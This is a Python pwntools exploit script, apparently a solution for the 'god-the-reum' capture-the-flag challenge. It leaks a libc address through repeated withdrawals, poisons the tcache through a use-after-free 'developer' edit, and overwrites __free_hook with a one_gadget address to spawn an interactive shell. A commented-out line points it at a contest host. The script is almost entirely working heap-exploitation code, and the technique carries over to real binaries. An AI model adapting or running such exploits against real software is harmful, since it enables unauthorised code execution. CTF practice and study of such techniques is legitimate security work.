#!/usr/bin/env python
from pwn import *

r = process(['./god-the-reum'], env={'LD_LIBRARY_PATH': './'})
#r = remote('110.10.147.103', 10001)

initial = [1, 256, 1, 8, 3, 0, 256, 3, 0, 0]
for cmd in initial:
    r.recvuntil(" : ")
    r.sendline(str(cmd))

def read_wallets():
    r.recvuntil(" : ")
    r.sendline("4")
    r.recvuntil("========== My Wallet List =============\n")
    line = r.recvline()
    ctr = 0
    dic = {}
    while "Ethereum wallet service" not in line:
        if "ballance" in line:
            val = long(line.split(", ballance ")[1])
            dic[ctr] = val
            ctr += 1
        line = r.recvline()
    return dic

def withdraw(wal, amt):
    r.recvuntil(" : ")
    r.sendline("3")
    r.recvuntil(" : ")
    r.sendline(str(wal))
    r.recvuntil(" : ")
    r.sendline(str(amt).strip("L"))

def create(amt):
    r.recvuntil(" : ")
    r.sendline("1")
    r.recvuntil(" : ")
    r.sendline(str(amt).strip("L"))

def developer(wal, s):
    r.recvuntil(" : ")
    r.sendline("6")
    r.recvuntil(" : ")
    r.sendline(str(wal))
    r.recvuntil(" : ")
    r.sendline(s)

for i in xrange(6):
    bal = read_wallets()
    withdraw(0, bal[0])

bal = read_wallets()
libc_base = bal[0] - 0x3ebca0
one_shot = libc_base + 0x4f322
free_hook = libc_base + 0x3ED8E8

withdraw(1, bal[1])
developer(1, p64(free_hook))
create(8)
create(8)
developer(3, p64(one_shot))

withdraw(2, 8)

r.interactive()

